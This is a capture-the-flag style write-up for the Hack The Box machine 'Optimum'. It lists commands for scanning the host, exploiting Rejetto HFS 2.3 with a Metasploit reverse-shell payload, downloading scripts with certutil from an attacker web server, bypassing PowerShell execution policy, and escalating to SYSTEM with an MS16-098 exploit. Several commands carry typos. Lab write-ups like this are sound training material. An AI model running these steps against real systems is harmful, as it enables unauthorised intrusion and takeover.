HTB 7. Optimum

1. `nmap -A -T4 -p- 10.10.10.8` reveals only port 80 running `httpd 2.3`
2. Going to `10.10.10.8` shows its a file server
3. Search for default credentials (httpd has no default credentials)
4. `searchsploit rejetto` (since rejetto is the vender of this file server)
5. Search google for `rejetto hfs 2.3 exploit` reveals metasploit remote code execution and many others
6. Nmap reveals probably an OS that the exploit works on
7. Metasploit `use exploit/windows/http/rejetto_hfs_exec`, set rhsots, and set payload to `windows/x64/meterpreter/reverse_tcp`
8. `set lhost tun0` instead of typing in IP (because its faster)
9. `sysinfo` shows `x64` on `x64` and `getid` is `kostas`
10. Attempt priv esc: `getsystem` fails, `background` and `use post/multi/recon/local_exploit_suggester` (`set session 1`) and `run` reveals nothing
11. **[`sherlock`](https://github.com/rasta-mouse/Sherlock) by `rastamouse` (or more up-to-date version [`Watson`](https://github.com/rasta-mouse/Watson))**
12. Search google for `windows 2002 r2 (build 9600) privilege escalation` reveals `exploit-db` exploit avaible that might possibly work
13. Search `ms16-032` in metasploit shows there is a module for it. Lets `use` it. Set target to `1` which is `x64`. Set `lhost tun0` and `lport 443`. Ran twice; didn't work.
14. Manual method: Download `sherlock` above as `sher.ps1`. Start http server with python and use cerutil (`certutil -urlcache -f http://10.10.14.14/sher.ps1 sher.ps1`) to download file. Run with `powershell.exe -exec bypass -Command "& {Import-Module .\sher.ps1; Find-AllVulns}"`. Result: 3 Potential vulnerabilities
15. **Clone [AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), run `python ./windows-exploit-suggester.py --update`**
16. Run `systeminfo` in shell on target and put in text file for `windows-exploit-suggester.py`.
17. Run `python ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt` which detects `MS16-098` exploit; download exploit from `exploit-db`.
18. `gcc 41020.c ex.exe` fails so lets download the binary from the link provided on `exploit-db`.
19. Run python web server, download to target, and run with `sh.exe`.
20. `whoami` gives us `nt authority\system`


